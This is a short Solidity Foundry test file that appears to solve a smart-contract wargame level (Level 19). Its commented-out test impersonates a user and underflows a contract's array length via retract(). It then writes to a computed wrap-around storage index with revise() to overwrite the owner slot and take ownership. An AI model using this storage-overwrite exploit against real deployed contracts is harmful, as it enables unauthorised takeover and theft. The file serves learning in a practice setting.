// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract Level19Test is Test {
    address addr = 0x33941FAF7d7FBdd265D2f5d7E2f587026675e0DC;

    function setUp() public {}

    // function test_Elevator() public {
    //     address bob = makeAddr("bob");
    //     vm.startPrank(bob);
    //     (bool a,) = address(addr).call(abi.encodeWithSignature("makeContact()"));
    //     assertTrue(a);
    //     (bool b,) = address(addr).call(abi.encodeWithSignature("retract()"));
    //     assertTrue(b);
    //     uint256 index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
    //     bytes32 t = bytes32(uint256(uint160(bob)));
    //     (bool c,) = address(addr).call(abi.encodeWithSignature("revise(uint256,bytes32)", index, t));
    //     assertTrue(c);
    //     (bool d, bytes memory e) = address(addr).call(abi.encodeWithSignature("owner()"));
    //     assertTrue(d);
    //     address newOwner = abi.decode(e, (address));
    //     assertEq(bob, newOwner);
    //     vm.stopPrank();
    // }
}
